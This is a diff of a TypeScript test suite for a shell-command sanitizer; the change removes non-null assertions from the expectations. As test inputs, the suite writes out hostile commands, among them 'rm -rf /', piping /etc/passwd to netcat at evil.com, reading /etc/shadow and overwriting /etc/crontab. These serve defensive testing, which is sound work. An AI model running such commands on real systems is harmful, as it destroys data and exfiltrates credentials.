@@ -162,115 +162,115 @@ describe('sanitizeCommand', () => {
   it('rejects semicolon injection', () => {
     const result = sanitizeCommand('ls /data; rm -rf /');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/semicolon/);
+    expect(result).toMatch(/semicolon/);
   });
 
   it('rejects pipe injection', () => {
     const result = sanitizeCommand('cat /etc/passwd | nc evil.com 4444');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/pipe|metacharacter/);
+    expect(result).toMatch(/pipe|metacharacter/);
   });
 
   it('rejects && injection', () => {
     const result = sanitizeCommand('ls /data && rm -rf /');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/AND list|metacharacter/);
+    expect(result).toMatch(/AND list|metacharacter/);
   });
 
   it('rejects || injection', () => {
     const result = sanitizeCommand('false || echo pwned');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/OR list|metacharacter/);
+    expect(result).toMatch(/OR list|metacharacter/);
   });
 
   it('rejects $() command substitution', () => {
     const result = sanitizeCommand('echo $(whoami)');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/\$\(/);
+    expect(result).toMatch(/\$\(/);
   });
 
   it('rejects backtick command substitution', () => {
     const result = sanitizeCommand('echo `id`');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/backtick/);
+    expect(result).toMatch(/backtick/);
   });
 
   it('rejects trailing & (backgrounding)', () => {
     const result = sanitizeCommand('rm -rf / &');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/background/);
+    expect(result).toMatch(/background/);
   });
 
   it('rejects output redirection', () => {
     const result = sanitizeCommand('echo pwned > /etc/crontab');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/redirection/);
+    expect(result).toMatch(/redirection/);
   });
 
   it('rejects input redirection', () => {
     const result = sanitizeCommand('cat < /etc/shadow');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/redirection/);
+    expect(result).toMatch(/redirection/);
   });
 
   it('rejects subshell grouping with parentheses', () => {
     const result = sanitizeCommand('(ls /data)');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/subshell|paren/);
+    expect(result).toMatch(/subshell|paren/);
   });
 
   it('rejects environment variable assignment prefix', () => {
     const result = sanitizeCommand('FOO=bar ls /data');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/env var|assignment/);
+    expect(result).toMatch(/env var|assignment/);
   });
 
   it('rejects here-documents', () => {
     const result = sanitizeCommand('cat <<EOF\nhello\nEOF');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/here-document/);
+    expect(result).toMatch(/here-document/);
   });
 
   it('rejects brace expansion', () => {
     const result = sanitizeCommand('echo {1..10}');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/brace/);
+    expect(result).toMatch(/brace/);
   });
 
   it('rejects process substitution', () => {
     const result = sanitizeCommand('diff <(cat a) <(cat b)');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/process substitution/);
+    expect(result).toMatch(/process substitution/);
   });
 
   it('rejects path traversal', () => {
     const result = sanitizeCommand('ls ../../etc/passwd');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/traversal/);
+    expect(result).toMatch(/traversal/);
   });
 
   it('rejects recursive glob patterns', () => {
     const result = sanitizeCommand('find **/*.js');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/glob/);
+    expect(result).toMatch(/glob/);
   });
 
   it('rejects empty commands', () => {
     const result = sanitizeCommand('');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/empty/);
+    expect(result).toMatch(/empty/);
   });
 
   it('rejects whitespace-only commands', () => {
     const result = sanitizeCommand('   ');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/empty/);
+    expect(result).toMatch(/empty/);
   });
 
   it('rejects comment-prefixed commands', () => {
     const result = sanitizeCommand('# rm -rf /');
     expect(result).not.toBeNull();
-    expect(result!).toMatch(/comment/);
+    expect(result).toMatch(/comment/);
   });
 
   it('accepts realistic safe workspace maintenance commands', () => {
